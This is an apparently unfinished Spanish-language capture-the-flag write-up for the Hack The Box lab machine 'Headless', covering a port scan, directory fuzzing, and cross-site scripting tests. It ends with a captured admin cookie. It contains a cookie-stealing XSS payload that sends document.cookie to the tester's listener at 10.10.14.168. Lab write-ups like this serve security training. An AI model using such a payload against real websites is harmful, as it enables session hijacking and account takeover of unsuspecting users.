#HTB - HEADLESS

## Enumeración de puertos/servicios

``` bash 
sudo nmap -sCVT 10.10.11.8
```

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/cc1af630-4f2d-477d-b696-6a4e17f1ece6)

Podemos ver 2 puertos abiertos:
- 22 (SSH)
- 5000 (posiblemente una web)

Vamos a probar si funciona la ip con el puerto 5000.

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/850f9ad0-3187-4e0d-a5cc-1eabf2706e0f)


Efectivamente funciona la web, una vez tenemos acceso a ella lo primero que vamos a hacer es realizar un fuzzing en busca de directorios:

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/d4766bf4-277e-4c2b-a129-c646d98be7d6)


## Detección de vulnerabilidades


![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/241dc6dd-04dd-4d20-891a-94850e1c1e4e)


![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/33cdc751-0bcf-4ee8-b42f-ab14de7a8d6c)



``` javascript
<script>alert(‘XSS’)</script>
```



Después de probar con algunos xss decido probar por otro lado a ver si funciona.

![[Pasted image 20240404164540.png]]

![[Pasted image 20240404183654.png]]

![[Pasted image 20240404183642.png]]

``` javascript
<img src=x onerror=fetch('http://10.10.14.168/?cpplie='+document.cookie);>
```

![[Pasted image 20240404184159.png]]


![[Pasted image 20240404184144.png]]

cookie: "ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"

![[Pasted image 20240404184300.png]]
